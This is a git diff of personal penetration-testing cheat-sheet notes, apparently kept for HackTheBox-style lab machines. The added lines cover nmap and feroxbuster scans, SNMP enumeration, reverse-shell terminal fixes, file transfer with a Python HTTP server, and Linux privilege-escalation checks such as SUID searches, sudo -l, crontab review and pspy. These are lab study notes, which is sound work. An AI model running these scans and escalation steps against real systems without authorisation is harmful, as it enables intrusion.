@@ -4,6 +4,7 @@
 	- after this scan, scanning more ports is good
 		- `nmap -sU -top-ports=100 -T5 {ip}`
 	- also trying --script=vulners might help
+	- also try `nmap -sV -sC -sT -p- --min-rate 5000 {ip}`
 
 - `wpscan -e ap,t,tt,u --url {url}`
 	- tool to use for wordpress enum
@@ -20,10 +21,16 @@
 	- on the host machine
 -  `export TERM=xterm`  
 	- something about clearing the screen on the reverse shell you now have
+- on a new tab on the base machine `stty -a`
+	- note the rows and columns number
+- back on reverse shell: run `stty rows {number} cols {number}`
+	- use the rows and columns from the previous command
+		- 42 rows 190 columns on parrot
 
 - `python3 -m http.server 8001` on host/machine with files
 - then  `wget {ip}:8001/{filename}`   on box/machine to get files
 	-  to get the files from one machine to another
+	- use `--recursive` to get directories or multiple files
 
 - /dev/shm
 	- I think this is writing files to be stored in RAM
@@ -80,10 +87,34 @@
 	- LFI filter work around 
 	- https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
 
-- 
+- snmpwalk
+	- https://net-snmp.sourceforge.io/docs/man/snmpwalk.html 
+	- snmp enumeration
+	- udp port 161
 
+- pspy
+	- https://github.com/DominicBreuker/pspy 
+	- way to watch for creds being passed on linux
+	- process snooping without needing root
 
+- https://medium.com/codex/linux-privilege-escalation-three-easy-ways-to-get-a-root-shell-255a71fcf2a0
+	- some privilege escalation tactics
+	- check for SUID binaries to run as root and esc privs
+		- `find / -type f -perm -u=s 2>/dev/null`
+		- use https://gtfobins.github.io/ to see if you can get a root shell as it
+	- `sudo -l` to check privs (another note about it above)
+	- `cat /etc/crontab` to check for cronjobs that can be exploited
+		- look for scripts that are ran that you can edit/manipulate
 
-- to lookup later:
-	- gobuster dir --url http://artcorp.htb -w wordlist/Seclists/Discovery/Web-Content/raft-small-words.txt --no-error -t 20
-	- ffuf -u ttp://artcorp.htb -w wordlist/Seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.artcorp.htb" -ac -c
+ - feroxbuster
+	 - cool version of gobuster or other directory scanning tools 
+	 - `feroxbuster -f --url {url}`
+	 - `--dont-scan` to exclude urls
+
+- https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+	- Guide on how to escape restricted shells
+	- 
+
+- things to look into:
+	- read later: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf 
+	- 
